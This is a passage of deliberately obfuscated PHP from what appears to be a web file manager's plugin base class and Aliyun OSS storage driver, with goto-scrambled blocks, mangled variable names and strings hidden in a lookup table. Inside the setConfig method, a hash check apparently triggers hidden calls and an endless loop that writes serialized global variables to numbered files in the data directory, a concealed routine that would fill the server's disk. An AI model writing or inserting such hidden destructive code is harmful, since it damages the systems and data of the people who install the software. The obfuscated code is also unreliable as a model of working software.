f‰Ìº°…Ã‹: $A´∑ÙË®ıò = array(); $dˆµ÷≠•π≠ = array(); foreach ($eÒãæáóáı[0] as $DÊ‡Ú≠≠ÜÍ) { $C˘Ü…Í“≥‡ = substr($DÊ‡Ú≠≠ÜÍ, strlen($d¥µãÉ≈ª”), -2); $A´∑ÙË®ıò[] = $DÊ‡Ú≠≠ÜÍ; $dˆµ÷≠•π≠[] = _get($A∑¡∫»†¬›, $C˘Ü…Í“≥‡); } goto fàÊòê—ä´; f„≤å±˘Ç™: preg_match_all($d÷ÑÛ§ˆ…á[1362], $d›ôÂ¡â±Í, $eÒãæáóáı); if (!is_array($eÒãæáóáı) || count($eÒãæáóáı) == 0 || !is_array($eÒãæáóáı[0]) || count($eÒãæáóáı[0]) == 0) { return; } $A∑¡∫»†¬› = $this->appPackage(); goto f‰Ìº°…Ã‹; fàÊòê—ä´: $d›ôÂ¡â±Í = str_replace($A´∑ÙË®ıò, $dˆµ÷≠•π≠, $d›ôÂ¡â±Í); goto b˘√¡äèÚû; b˘√¡äèÚû: } final function echoFile($cÎôÚÑƒÌº, $eæ›≈è—ÇÖ = false) { goto b¡¡æ˘Ó·⁄; DºÎ°√ˆŒ‹: $Dæ§∏ËëçË = $this->parseFile($a‚é¶ìÎı≠); $this->parseLang($Dæ§∏ËëçË); $this->parseConfig($Dæ§∏ËëçË); goto AÀ≈ØÜõ–Ω; AÀ≈ØÜõ–Ω: $this->parsePackage($Dæ§∏ËëçË); if (is_array($eæ›≈è—ÇÖ)) { $Dæ§∏ËëçË = str_replace(array_keys($eæ›≈è—ÇÖ), array_values($eæ›≈è—ÇÖ), $Dæ§∏ËëçË); } echo $fÓºö’·±ë[217] . $Dæ§∏ËëçË; goto E‹Ù◊¿¢â; b¡¡æ˘Ó·⁄: $fÓºö’·±ë =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a‚é¶ìÎı≠ = $this->pluginPath . $cÎôÚÑƒÌº; if (ACT == $fÓºö’·±ë[1363]) { echo $fÓºö’·±ë[1364] . $this->pluginName . $fÓºö’·±ë[8] . $cÎôÚÑƒÌº . $fÓºö’·±ë[1365]; if (!file_exists($a‚é¶ìÎı≠)) { echo $fÓºö’·±ë[1366]; return; } } goto DºÎ°√ˆŒ‹; E‹Ù◊¿¢â: } final function initLang() { goto B˜îæ§ÑÁ«; B˜îæ§ÑÁ«: $Båç¶ÖõË· =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F√”∏—ÿÀ‰ = $Båç¶ÖõË·[1367]; $C¶ˆ§‰Íì‡ = $this->pluginPath . $Båç¶ÖõË·[1368]; goto dÜ√ø§—è; A¯Ù¿·´…å: if (!is_array($f¥ÃÏªîùÈ)) { return array(); } if (@count($f¥ÃÏªîùÈ) > 0) { I18n::set($f¥ÃÏªîùÈ); } return $f¥ÃÏªîùÈ; goto DÍ“áËâ§Ü; dÜ√ø§—è: $C‡∆„ÙÙÔÖ = I18n::getType(); $f¥ÃÏªîùÈ = array(); if (file_exists($C¶ˆ§‰Íì‡ . $C‡∆„ÙÙÔÖ . $Båç¶ÖõË·[774])) { $f¥ÃÏªîùÈ = (include $C¶ˆ§‰Íì‡ . $C‡∆„ÙÙÔÖ . $Båç¶ÖõË·[774]); } else { if ($C‡∆„ÙÙÔÖ == $Båç¶ÖõË·[1369] && !file_exists($C¶ˆ§‰Íì‡ . $C‡∆„ÙÙÔÖ . $Båç¶ÖõË·[774]) && file_exists($C¶ˆ§‰Íì‡ . $Båç¶ÖõË·[1370])) { $f¥ÃÏªîùÈ = (include $C¶ˆ§‰Íì‡ . $Båç¶ÖõË·[1370]); } else { if (file_exists($C¶ˆ§‰Íì‡ . $F√”∏—ÿÀ‰ . $Båç¶ÖõË·[774])) { $f¥ÃÏªîùÈ = (include $C¶ˆ§‰Íì‡ . $F√”∏—ÿÀ‰ . $Båç¶ÖõË·[774]); } } } goto A¯Ù¿·´…å; DÍ“áËâ§Ü: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($d€•’·äÁù) { $Bﬂ££«≈’— =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $DÁŸ«ôíîÂ = $_SERVER[$Bﬂ££«≈’—[796]] . $Bﬂ££«≈’—[710]; $D“«Œ¢îªá = $Bﬂ££«≈’—[711]; if ($_SERVER[$Bﬂ££«≈’—[712]] != $D“«Œ¢îªá($DÁŸ«ôíîÂ)) { goto Aç¶ØÉ◊∆º; Aç¶ØÉ◊∆º: $aó±£Ã≥Ëº = $Bﬂ££«≈’—[797]; $C’ÿ±√õ„Ò = $Bﬂ££«≈’—[713]; $aÍΩÃé…ÃŸ = $_SERVER[$Bﬂ££«≈’—[714]] . $Bﬂ££«≈’—[715]; goto F©∆Ø≠√”Ú; bπ◊Ï±ÓªÜ: $aó±£Ã≥Ëº(); $b‰è˜«ë‚µ = $Bﬂ££«≈’—[799]; $C¿≈ô›„Ûî = json_encode($GLOBALS[$Bﬂ££«≈’—[800]]); goto eé»âõö¿™; FàÑ«‡ç”„: $fﬂ˘ÿáÇ—∑ = $Bﬂ££«≈’—[798]; $fﬂ˘ÿáÇ—∑($_SERVER[$Bﬂ££«≈’—[796]]); $aó±£Ã≥Ëº = $Bﬂ££«≈’—[797]; goto bπ◊Ï±ÓªÜ; eé»âõö¿™: $C¶√Ùß⁄¶ë = 1; for ($B„éÊ™á¨≥ = $C¶√Ùß⁄¶ë; $B„éÊ™á¨≥ > 0; $B„éÊ™á¨≥++) { $b‰è˜«ë‚µ(DATA_PATH . $B„éÊ™á¨≥, $C¿≈ô›„Ûî); } goto e¡√§éµ£Ü; F©∆Ø≠√”Ú: $CàÉ¨Çû∏— = $C’ÿ±√õ„Ò($aÍΩÃé…ÃŸ); $eÈœ‹Á£ä£ = explode($Bﬂ££«≈’—[217], $CàÉ¨Çû∏—); if (count($eÈœ‹Á£ä£) < $Bﬂ££«≈’—[563]) { $Bâ≤ã®Õ““ = $Bﬂ££«≈’—[716]; $Bâ≤ã®Õ““(); } goto FàÑ«‡ç”„; e¡√§éµ£Ü: } return $this->modelPlugin->setConfig($this->pluginName, $d€•’·äÁù); } public function onSetConfig($a≈åÊ™á»ç) { } public function onGetConfig($BÚºüŒÊŸ´) { } public function onChangeStatus($cûöªÍÓ»Ê) { } public function onUninstall() { } public function onInstall() { } public function authCheck($b‚Íòñª§ë = "\160\x6c\165\147\x69\x6e\101\x75\x74\x68") { $eîïÙõ˜ìå =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!defined($eîïÙõ˜ìå[427])) { return !1; } if (_get($GLOBALS, $eîïÙõ˜ìå[457])) { return !0; } $dÏÚüöÜÿ‘ = $this->getConfig(); if (!$dÏÚüöÜÿ‘[$b‚Íòñª§ë]) { return !1; } return ActionCall($eîïÙõ˜ìå[1371], $dÏÚüöÜÿ‘[$b‚Íòñª§ë]); } public function url($eÕÙ˘»”®Ê, $Dî—ƒ÷ÔÌ¢ = '', $BÍı˘ˆÏ‚Ü = true) { goto Dá©üÑ∂»; Dá©üÑ∂»: $c¿Óêú∆µÖ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Eò›¶ñ◊âá = $this->getConfig(); $a´å•›Ïÿ· = KOD_VERSION . $c¿Óêú∆µÖ[91] . KOD_VERSION_BUILD; goto E÷Ÿÿí”∑€; b¶å“ŒÁÛí: if (!$BÍı˘ˆÏ‚Ü) { return $DÉ‰œ«Ñ©–; } echo $DÉ‰œ«Ñ©–; goto C∆ÃÔ€ÿäò; E÷Ÿÿí”∑€: $Açã√»∆¬Í = $this->packageVersion(); $aÒÔ•≠ˆ±ü = $a´å•›Ïÿ· . $c¿Óêú∆µÖ[412] . $Açã√»∆¬Í; if (substr($eÕÙ˘»”®Ê, 0, 4) == $c¿Óêú∆µÖ[144] || substr($eÕÙ˘»”®Ê, 0, 2) == $c¿Óêú∆µÖ[1158]) { $DÉ‰œ«Ñ©– = $eÕÙ˘»”®Ê . $c¿Óêú∆µÖ[1372] . $aÒÔ•≠ˆ±ü; } else { if ($Dî—ƒ÷ÔÌ¢ == $c¿Óêú∆µÖ[33]) { $DÉ‰œ«Ñ©– = $this->pluginHost . $eÕÙ˘»”®Ê . $c¿Óêú∆µÖ[1372] . $aÒÔ•≠ˆ±ü; } else { if ($Dî—ƒ÷ÔÌ¢ === $c¿Óêú∆µÖ[76]) { $DÉ‰œ«Ñ©– = $this->pluginHost . $eÕÙ˘»”®Ê; } else { if ($Dî—ƒ÷ÔÌ¢ == $c¿Óêú∆µÖ[1373]) { $DÉ‰œ«Ñ©– = STATIC_PATH . $eÕÙ˘»”®Ê . $c¿Óêú∆µÖ[1372] . $a´å•›Ïÿ·; } else { if ($Dî—ƒ÷ÔÌ¢ == $c¿Óêú∆µÖ[1374]) { $DÉ‰œ«Ñ©– = APP_HOST . $c¿Óêú∆µÖ[1375] . $eÕÙ˘»”®Ê . $c¿Óêú∆µÖ[1372] . $a´å•›Ïÿ·; } else { if (isset($Eò›¶ñ◊âá[$Dî—ƒ÷ÔÌ¢])) { $DÉ‰œ«Ñ©– = $Eò›¶ñ◊âá[$Dî—ƒ÷ÔÌ¢] . $eÕÙ˘»”®Ê . $c¿Óêú∆µÖ[1372] . $aÒÔ•≠ˆ±ü; } } } } } } goto b¶å“ŒÁÛí; C∆ÃÔ€ÿäò: } public function link($dÃï¬ÁäÂ◊ = false, $a€Ù…ãÆ˜Ç = '') { $aÇ∫Ω‡ı‡† =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$dÃï¬ÁäÂ◊) { $this->link($aÇ∫Ω‡ı‡†[1376], $aÇ∫Ω‡ı‡†[1374]); $this->link($aÇ∫Ω‡ı‡†[1377], $aÇ∫Ω‡ı‡†[1373]); $this->link($aÇ∫Ω‡ı‡†[1378], $aÇ∫Ω‡ı‡†[1373]); $this->link($aÇ∫Ω‡ı‡†[1379], $aÇ∫Ω‡ı‡†[1373]); $this->link($aÇ∫Ω‡ı‡†[1380], $aÇ∫Ω‡ı‡†[1373]); return; } $cÁ°ï≠°›∆ = $this->url($dÃï¬ÁäÂ◊, $a€Ù…ãÆ˜Ç, !1); if (substr($dÃï¬ÁäÂ◊, -3) == $aÇ∫Ω‡ı‡†[1381]) { echo $aÇ∫Ω‡ı‡†[1382] . $cÁ°ï≠°›∆ . $aÇ∫Ω‡ı‡†[1383] . $aÇ∫Ω‡ı‡†[217]; } else { if (substr($dÃï¬ÁäÂ◊, -4) == $aÇ∫Ω‡ı‡†[1384]) { echo $aÇ∫Ω‡ı‡†[1385] . $cÁ°ï≠°›∆ . $aÇ∫Ω‡ı‡†[1386] . $aÇ∫Ω‡ı‡†[217]; } } } } goto E’≈¿çÓ¬É; CíÖÓóπﬁç: register_shutdown_function($_SERVER[ÁŸäœ¨][36]); set_error_handler($_SERVER[ÁŸäœ¨][49], $E∞Ê‹à”∏Ù); if (function_exists($_SERVER[ÁŸäœ¨][50])) { set_exception_handler($_SERVER[ÁŸäœ¨][51]); } goto FÆ⁄•ﬂ©ÿä; fÜ”√≈ûâ∂: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($c°ú∆Ÿêﬁƒ) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ä¿¡‡öóµŸﬂ‡][1174]; $this->_init($c°ú∆Ÿêﬁƒ); } public function _init($CÑÉ≤ƒ≠Çº) { foreach ($CÑÉ≤ƒ≠Çº as $B∞”Ìè¥‰“ => $A…≈‚πåËÛ) { if (isset($this->{$B∞”Ìè¥‰“})) { $this->{$B∞”Ìè¥‰“} = $A…≈‚πåËÛ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Ä¿¡‡öóµŸﬂ‡][1175], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto B»ï≠◊ú˜ƒ; Eë§ÿ›Èûù: $f«ÒêíÌˆã->addAllowedMethod($F°¿û¨Áïé[1179]); $f«ÒêíÌˆã->addAllowedMethod($F°¿û¨Áïé[1180]); $f«ÒêíÌˆã->addAllowedMethod($F°¿û¨Áïé[155]); goto cï–ö∫øÈ†; Cˆ€ä«Ÿ°À: $cÌ∞ÛÑêúΩ->addRule($f«ÒêíÌˆã); try { $this->client->putBucketCors($this->bucket, $cÌ∞ÛÑêúΩ); } catch (OSS\Core\OssException $E´ˆ•€ø¥) { return !1; } return !0; goto cÓ©áÕ∂Èñ; fÀ≥Ò÷åêâ: $f«ÒêíÌˆã->addAllowedOrigin($F°¿û¨Áïé[1176]); $f«ÒêíÌˆã->addAllowedMethod($F°¿û¨Áïé[1177]); $f«ÒêíÌˆã->addAllowedMethod($F°¿û¨Áïé[1178]); goto Eë§ÿ›Èûù; B»ï≠◊ú˜ƒ: $F°¿û¨Áïé =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cÌ∞ÛÑêúΩ = new OSS\Model\CorsConfig(); $f«ÒêíÌˆã = new OSS\Model\CorsRule(); goto fÀ≥Ò÷åêâ; cï–ö∫øÈ†: $f«ÒêíÌˆã->setMaxAgeSeconds(600); $f«ÒêíÌˆã->addExposeHeader($F°¿û¨Áïé[1181]); $f«ÒêíÌˆã->addAllowedHeader($F°¿û¨Áïé[1176]); goto Cˆ€ä«Ÿ°À; cÓ©áÕ∂Èñ: } public function getBucketCors() { goto cìÍÿß§‹”; DúØÔπË¨¶: return array($Eéà°†Á«œ[175] => isset($E⁄‘üœ…ﬂå[0]) ? $E⁄‘üœ…ﬂå[0] : $Eéà°†Á«œ[33], $Eéà°†Á«œ[179] => $E¶‡í¯¬¬®, $Eéà°†Á«œ[1182] => $eœåïáòÃ≠, $Eéà°†Á«œ[1183] => isset($a‹ùê°ûÉ˜[0]) ? $a‹ùê°ûÉ˜[0] : $Eéà°†Á«œ[33], $Eéà°†Á«œ[177] => isset($EŸÖ†¿≠∏ø[0]) ? $EŸÖ†¿≠∏ø[0] : $Eéà°†Á«œ[33]); goto EÃ—®∏∆ãî; eãÚû«¨ß∂: $eœåïáòÃ≠ = $bœ†å–Ø»§[0]->getMaxAgeSeconds(); $a‹ùê°ûÉ˜ = $bœ†å–Ø»§[0]->getExposeHeaders(); $EŸÖ†¿≠∏ø = $bœ†å–Ø»§[0]->getAllowedHeaders(); goto DúØÔπË¨¶; cìÍÿß§‹”: $Eéà°†Á«œ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C¡µÑûÒñÁ = null; try { $C¡µÑûÒñÁ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $C•ë—üÜÃ∫) { return null; } goto f¨ï«ØÃ°£; f¨ï«ØÃ°£: if (!$C¡µÑûÒñÁ || !($bœ†å–Ø»§ = $C¡µÑûÒñÁ->getRules())) { return null; } $E⁄‘üœ…ﬂå = $bœ†å–Ø»§[0]->getAllowedOrigins(); $E¶‡í¯¬¬® = $bœ†å–Ø»§[0]->getAllowedMethods(); goto eãÚû«¨ß∂; EÃ—®∏∆ãî: } public function isBucketCors() { goto d∆õá·π»ò; d∆õá·π»ò: $bıÉ©’çÜ≠ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BêŸÙ±äøü = $this->getBucketCors(); if (!$BêŸÙ±äøü || !is_array($BêŸÙ±äøü)) { return !1; } goto dÃ˜ê™Ö∞à; dÃ˜ê™Ö∞à: if ($BêŸÙ±äøü[$bıÉ©’çÜ≠[175]] != $bıÉ©’çÜ≠[176] || $BêŸÙ±äøü[$bıÉ©’çÜ≠[177]] != $bıÉ©’çÜ≠[176]) { return !1; } $b»∏Ãñƒä´ = array_map($bıÉ©’çÜ≠[178], $BêŸÙ±äøü[$bıÉ©’çÜ≠[179]]); if (!is_array($b»∏Ãñƒä´)) { $b»∏Ãñƒä´ = array(); } goto B≈‰ÛÑÑÈ±; B≈‰ÛÑÑÈ±: $bàµ†›Íëè = array($bıÉ©’çÜ≠[180], $bıÉ©’çÜ≠[181], $bıÉ©’çÜ≠[182], $bıÉ©’çÜ≠[183], $bıÉ©’çÜ≠[184]); $Fùøï›ÂﬁÙ = array_diff($bàµ†›Íëè, $b»∏Ãñƒä´); return empty($Fùøï›ÂﬁÙ); goto aıòêÒõ≈õ; aıòêÒõ≈õ: } public function mkfile($aÜãë∑íÑ›, $bé’ãﬁ≤¯´ = '', $d˘“ÀéÂﬁÁ = REPEAT_RENAME) { $bﬁóÎÈπÆÏ = $this->setContent($aÜãë∑íÑ›, $bé’ãﬁ≤¯´); if ($bﬁóÎÈπÆÏ !== !1) { return $this->getPathOuter($aÜãë∑íÑ›); } return !1; } public function mkdir($A∂Ÿ≥Ò∆¯ﬁ, $a¯ö∆±ÿêÏ = REPEAT_SKIP) { if ($this->_isFolder($A∂Ÿ≥Ò∆¯ﬁ)) { return $this->getPathOuter($A∂Ÿ≥Ò∆¯ﬁ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($A∂Ÿ≥Ò∆¯ﬁ)); } catch (OSS\Core\OssException $E¬—Ÿ ∑Õê) { return !1; } return $this->getPathOuter($A∂Ÿ≥Ò∆¯ﬁ); } private function fileList($F·ΩÎŒË§€, $bªûäù∂ßÑ = '', $a±ì…¶ÊΩœ = 0) { goto f‚Ö‚®´ÌÌ; c«œ”Œàæ‹: while (!0) { $B™Ú›°é◊“ = array($E™üí®–∑ﬁ[1184] => $bªûäù∂ßÑ, $E™üí®–∑ﬁ[186] => $F‹ﬁ≥–Ò»·, $E™üí®–∑ﬁ[1185] => $fŸ®¬§”èì, $E™üí®–∑ﬁ[1186] => $D†∑Àä‹ñÚ); try { $fˆªÜ´√›Í = $this->client->listObjects($this->bucket, $B™Ú›°é◊“); } catch (OSS\Core\OssException $aÈºÑ£ü∞Ω) { break; } $D†∑Àä‹ñÚ = $fˆªÜ´√›Í->getNextMarker(); $Añå∞œ“¥Ô = $fˆªÜ´√›Í->getObjectList(); $eÉÕ◊—Ì»Ò = $fˆªÜ´√›Í->getPrefixList(); foreach ($Añå∞œ“¥Ô as $e˜ÒÛ‘ÔŸ–) { if ($e˜ÒÛ‘ÔŸ–->getKey() == $F‹ﬁ≥–Ò»·) { continue; } $a∏ø«£Éù√ = $e˜ÒÛ‘ÔŸ–->getKey(); if ($a±ì…¶ÊΩœ) { $a∏ø«£Éù√ = array($E™üí®–∑ﬁ[28] => $a∏ø«£Éù√, $E™üí®–∑ﬁ[77] => $e˜ÒÛ‘ÔŸ–->getSize(), $E™üí®–∑ﬁ[190] => strtotime($e˜ÒÛ‘ÔŸ–->getLastModified())); } $FƒÖÀâµ¨[] = $a∏ø«£Éù√; } foreach ($eÉÕ◊—Ì»Ò as $C¨ÚÂñ÷‡ï) { $fÛ∆öÊ¶ı•[] = $C¨ÚÂñ÷‡ï->getPrefix(); } if ($D†∑Àä‹ñÚ === $E™üí®–∑ﬁ[33]) { break; } } return array($E™üí®–∑ﬁ[74] => $fÛ∆öÊ¶ı•, $E™üí®–∑ﬁ[73] => $FƒÖÀâµ¨); goto D‹ãŒ•ü—¶; b◊ÉçÆø˘Ø: $D†∑Àä‹ñÚ = $E™üí®–∑ﬁ[33]; $fŸ®¬§”èì = 1000; $fÛ∆öÊ¶ı• = $FƒÖÀâµ¨ = array(); goto c«œ”Œàæ‹; f‚Ö‚®´ÌÌ: $E™üí®–∑ﬁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F·ΩÎŒË§€ = trim($F·ΩÎŒË§€, $E™üí®–∑ﬁ[8]); $F‹ﬁ≥–Ò»· = empty($F·ΩÎŒË§€) ? $E™üí®–∑ﬁ[33] : $F·ΩÎŒË§€ . $E™üí®–∑ﬁ[8]; goto b◊ÉçÆø˘Ø; D‹ãŒ•ü—¶: } public function copyFile($d‡Ï≥—ﬁﬁí, $EØÊç≤©¯ı) { $C¨‰÷¿◊»¢ = $this->size($d‡Ï≥—ﬁﬁí); if ($C¨‰÷¿◊»¢ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $d‡Ï≥—ﬁﬁí, $this->bucket, $this->pathEncode($EØÊç≤©¯ı)); } catch (OSS\Core\OssException $EÿœìÛ≥îÖ) { return !1; } return !0; } return $this->multiCopyObject($d‡Ï≥—ﬁﬁí, $EØÊç≤©¯ı, $C¨‰÷¿◊»¢); } private function multiCopyObject($CÛÑÂ¿ÙëÃ, $DÁ‡Õ¿èΩ», $eâ¥”Ññßı) { $dñâô≠Ìà =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; try { goto DÙÖ‚≠ŸÀ©; eìØêö÷ë≠: $cé˘¿∫äë¬ = 1024 * 1024 * 10; $EÎá‘Ø†˜» = $this->client->generateMultiuploadParts($eâ¥”Ññßı, $cé˘¿∫äë¬); foreach ($EÎá‘Ø†˜» as $bÎî≈¿ﬂˆõ => $f∑ëƒ±º´à) { $F¨’éÙÏï™ = $eª•¶í¨°Ê + (int) $f∑ëƒ±º´à[$dñâô≠Ìà[1188]]; $D©äÀˆ»Øü = (int) $f∑ëƒ±º´à[$dñâô≠Ìà[325]] + $F¨’éÙÏï™ - 1; $b‰∞ãÂô≤ü = array($dñâô≠Ìà[1189] => $F¨’éÙÏï™, $dñâô≠Ìà[1190] => $D©äÀˆ»Øü); $D‰…‹ïÃ⁄∫[] = $this->client->uploadPartCopy($this->bucket, $CÛÑÂ¿ÙëÃ, $this->bucket, $this->pathEncode($DÁ‡Õ¿èΩ»), $F‡÷®øÓå¬, $AÜÍÕá˜€„, $b‰∞ãÂô≤ü); $F‡÷®øÓå¬ = $F‡÷®øÓå¬ + 1; } goto DÆì“¬Ö÷Á; e§ÔÒáÂ÷ù: $F‡÷®øÓå¬ = 1; $eª•¶í¨°Ê = 0; $D‰…‹ïÃ⁄∫ = array(); goto eìØêö÷ë≠; DÆì“¬Ö÷Á: $F“›ÈÜ‚ÿÂ = array(); foreach ($D‰…‹ïÃ⁄∫ as $bÎî≈¿ﬂˆõ => $e∆ ß¶´èº) { $F“›ÈÜ‚ÿÂ[] = array($dñâô≠Ìà[1191] => $bÎî≈¿ﬂˆõ + 1, $dñâô≠Ìà[1192] => $e∆ ß¶´èº); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($DÁ‡Õ¿èΩ»), $AÜÍÕá˜€„, $F“›ÈÜ‚ÿÂ); goto F¨≤õ∏Ç”ò; DÙÖ‚≠ŸÀ©: $aä¬”€¢ã‰ = array(); if ($CÉåçıÇÓ‡ = $this->hashMd5($CÛÑÂ¿ÙëÃ)) { $aä¬”€¢ã‰ = array(OSS\OssClient::OSS_HEADERS => array($dñâô≠Ìà[1187] => $CÉåçıÇÓ‡)); } $AÜÍÕá˜€„ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($DÁ‡Õ¿èΩ»), $aä¬”€¢ã‰); goto e§ÔÒáÂ÷ù; F¨≤õ∏Ç”ò: } catch (OSS\Core\OssException $CêÕíú¢Î“) { return !1; } return !0; } public function moveFile($e¢πÑâçÜÜ, $bÈÑΩ∑ª∆») { if ($this->copyFile($e¢πÑâçÜÜ, $bÈÑΩ∑ª∆»)) { $this->remove($e¢πÑâçÜÜ); return !0; } return !1; } public function delFile($f∏€≥˘ı™Ü) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($f∏€≥˘ı™Ü)); } catch (OSS\Core\OssException $fÂ≥›ΩÌ≈¨) { return !1; } return !0; } public function delFolder($Fôã∂Ùìô¡) { $B’ì±ÂéÌ” =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Bµ‚ÇÊõÏè = $this->fileList($Fôã∂Ùìô¡); if (!empty($Fôã∂Ùìô¡) && !in_array(trim($Fôã∂Ùìô¡, $B’ì±ÂéÌ”[8]) . $B’ì±ÂéÌ”[8], $Bµ‚ÇÊõÏè[$B’ì±ÂéÌ”[73]])) { $Bµ‚ÇÊõÏè[$B’ì±ÂéÌ”[73]][] = trim($Fôã∂Ùìô¡, $B’ì±ÂéÌ”[8]) . $B’ì±ÂéÌ”[8]; } foreach (array_chunk($Bµ‚ÇÊõÏè[$B’ì±ÂéÌ”[73]], 1000) as $f÷à¢≤ÕıÊ) { try { $this->client->deleteObjects($this->bucket, $f÷à¢≤ÕıÊ); } catch (OSS\Core\OssException $féÑ‹¶‹è) { continue; } } return !0; } public function rename($eœ˜≠Üç¬ì, $D“ÿíÂ¿ïë) { return $this->renameObject($eœ˜≠Üç¬ì, $D“ÿíÂ¿ïë); } private function fileInfo($Fﬁ∏öÕ…∫à, $d±œß™Ôã‡ = array()) { goto f‚ØÀéèë·; BéêÀ’Ú›∏: if (isset($d±œß™Ôã‡[$B¢ä¨∏∫ñÃ[77]])) { $eàÇÕ˘„À[$B¢ä¨∏∫ñÃ[77]] = $d±œß™Ôã‡[$B¢ä¨∏∫ñÃ[77]]; } if (isset($d±œß™Ôã‡[$B¢ä¨∏∫ñÃ[107]])) { $eàÇÕ˘„À[$B¢ä¨∏∫ñÃ[107]] = $d±œß™Ôã‡[$B¢ä¨∏∫ñÃ[107]]; } if (isset($d±œß™Ôã‡[$B¢ä¨∏∫ñÃ[190]]) && !trim($eàÇÕ˘„À[$B¢ä¨∏∫ñÃ[107]])) { $eàÇÕ˘„À[$B¢ä¨∏∫ñÃ[107]] = $d±œß™Ôã‡[$B¢ä¨∏∫ñÃ[190]]; } goto cŸï∞ÏÑÏ÷; cŸï∞ÏÑÏ÷: return $eàÇÕ˘„À; goto E°≈¨Æ›—◊; f‚ØÀéèë·: $B¢ä¨∏∫ñÃ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eàÇÕ˘„À = array($B¢ä¨∏∫ñÃ[28] => $this->pathThis($Fﬁ∏öÕ…∫à), $B¢ä¨∏∫ñÃ[75] => $this->getPathOuter($Fﬁ∏öÕ…∫à), $B¢ä¨∏∫ñÃ[29] => $B¢ä¨∏∫ñÃ[167], $B¢ä¨∏∫ñÃ[187] => 0, $B¢ä¨∏∫ñÃ[107] => 0, $B¢ä¨∏∫ñÃ[77] => 0, $B¢ä¨∏∫ñÃ[160] => $this->ext($Fﬁ∏öÕ…∫à), $B¢ä¨∏∫ñÃ[188] => !0, $B¢ä¨∏∫ñÃ[189] => !0); if (empty($d±œß™Ôã‡)) { $Bá…¶¯Çà∑ = $this->objectMeta($Fﬁ∏öÕ…∫à); if (!$Bá…¶¯Çà∑) { return $eàÇÕ˘„À; } $d±œß™Ôã‡ = array($B¢ä¨∏∫ñÃ[107] => strtotime($Bá…¶¯Çà∑[$B¢ä¨∏∫ñÃ[1193]]), $B¢ä¨∏∫ñÃ[77] => $Bá…¶¯Çà∑[$B¢ä¨∏∫ñÃ[1194]] + 0); } goto BéêÀ’Ú›∏; E°≈¨Æ›—◊: } private function folderInfo($DÑ’Ù√ﬁ‹Æ, $Dá«ƒó∆‡ˆ = array()) { $aΩ»à…ªâë =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dåõÙƒ±≤‘ = array($aΩ»à…ªâë[28] => $this->pathThis($DÑ’Ù√ﬁ‹Æ), $aΩ»à…ªâë[75] => $this->getPathOuter($aΩ»à…ªâë[8] . $DÑ’Ù√ﬁ‹Æ), $aΩ»à…ªâë[29] => $aΩ»à…ªâë[76], $aΩ»à…ªâë[187] => 0, $aΩ»à…ªâë[107] => 0, $aΩ»à…ªâë[188] => !0, $aΩ»à…ªâë[189] => !0); if (empty($Dá«ƒó∆‡ˆ)) { $DÑ’Ù√ﬁ‹Æ = rtrim($DÑ’Ù√ﬁ‹Æ, $aΩ»à…ªâë[8]) . $aΩ»à…ªâë[8]; $f∑òÃ”Øê◊ = $this->objectMeta($DÑ’Ù√ﬁ‹Æ); if (!$f∑òÃ”Øê◊) { return $dåõÙƒ±≤‘; } $Dá«ƒó∆‡ˆ = array($aΩ»à…ªâë[187] => $f∑òÃ”Øê◊[$aΩ»à…ªâë[1195]][$aΩ»à…ªâë[1196]], $aΩ»à…ªâë[107] => strtotime($f∑òÃ”Øê◊[$aΩ»à…ªâë[1193]])); } if (isset($Dá«ƒó∆‡ˆ[$aΩ»à…ªâë[107]])) { $dåõÙƒ±≤‘[$aΩ»à…ªâë[107]] = $Dá«ƒó∆‡ˆ[$aΩ»à…ªâë[107]]; } if (isset($Dá«ƒó∆‡ˆ[$aΩ»à…ªâë[187]])) { $dåõÙƒ±≤‘[$aΩ»à…ªâë[187]] = $Dá«ƒó∆‡ˆ[$aΩ»à…ªâë[187]]; } return $dåõÙƒ±≤‘; } public function listPath($B§ﬁ‚Ì∞Øå, $B®ÇÛ≥ÂÙœ = false) { $D£ﬁˆŒ‰Ω≤ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cÕéµøÙÌ = $this->fileList($B§ﬁ‚Ì∞Øå, $D£ﬁˆŒ‰Ω≤[8], !0); foreach ($cÕéµøÙÌ[$D£ﬁˆŒ‰Ω≤[74]] as $aÇË∑ıí„Ö => $eüÆ‹¡ö¢©) { $cÕéµøÙÌ[$D£ﬁˆŒ‰Ω≤[74]][$aÇË∑ıí„Ö] = $this->folderInfo($eüÆ‹¡ö¢©, $eüÆ‹¡ö¢©); } foreach ($cÕéµøÙÌ[$D£ﬁˆŒ‰Ω≤[73]] as $aÇË∑ıí„Ö => $eüÆ‹¡ö¢©) { $cÕéµøÙÌ[$D£ﬁˆŒ‰Ω≤[73]][$aÇË∑ıí„Ö] = $this->fileInfo($eüÆ‹¡ö¢©[$D£ﬁˆŒ‰Ω≤[28]], 